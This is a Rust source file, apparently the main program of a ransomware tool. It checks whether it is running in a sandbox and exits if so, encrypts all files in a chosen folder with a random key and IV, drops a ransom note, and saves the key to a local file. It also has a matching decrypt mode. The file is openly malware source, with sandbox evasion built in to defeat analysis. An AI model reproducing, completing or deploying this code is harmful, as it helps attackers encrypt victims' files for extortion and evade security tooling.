use std::env;
use std::fs::File;
use std::io::{Read, Write};
use std::path::Path;

use rand::Rng;

mod fileops;
mod stealth;

const KEY_FILE: &str = "keyinfo.bin";

fn main() {
    if stealth::is_sandbox() {
        println!("Unsafe Env");
        std::process::exit(1);
    }
    
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        eprintln!("Usage: {} <encrypt|decrypt> <folder_path>", args[0]);
        std::process::exit(1);
    }

    let mode = &args[1];
    let target_folder = &args[2];
    let path = Path::new(target_folder);

    if !path.exists() || !path.is_dir() {
        eprintln!("[!] Invalid folder path: {}", target_folder);
        std::process::exit(1);
    }

    match mode.as_str() {
        "encrypt" => {
            // Generate key and IV
            let mut rng = rand::thread_rng();
            let mut key = [0u8; 32];
            let mut iv = [0u8; 16];
            rng.fill(&mut key);
            rng.fill(&mut iv);

            println!("[+] Encrypting files in: {}", path.display());
            fileops::encrypt_directory(path, &key, &iv);

            println!("[+] Dropping ransom note...");
            fileops::drop_ransom_note();

            // Save key + IV to file
            let mut f = File::create(KEY_FILE).expect("Failed to create key file");
            f.write_all(&key).expect("Failed to write key");
            f.write_all(&iv).expect("Failed to write IV");

            println!("[✓] Done. Key saved to '{}'", KEY_FILE);
        }

        "decrypt" => {
            println!("[+] Reading key from '{}'", KEY_FILE);

            // Load key and IV
            let mut buf = vec![];
            File::open(KEY_FILE)
                .expect("Could not open key file")
                .read_to_end(&mut buf)
                .expect("Failed to read key file");

            if buf.len() != 48 {
                eprintln!("[!] Key file malformed. Expected 48 bytes, got {}", buf.len());
                std::process::exit(1);
            }

            let key: [u8; 32] = buf[0..32].try_into().unwrap();
            let iv: [u8; 16] = buf[32..48].try_into().unwrap();

            println!("[+] Decrypting files in: {}", path.display());
            fileops::decrypt_directory(path, &key, &iv);

            println!("[✓] Decryption complete.");
        }

        _ => {
            eprintln!("Usage: {} <encrypt|decrypt> <folder_path>", args[0]);
            std::process::exit(1);
        }
    }
}
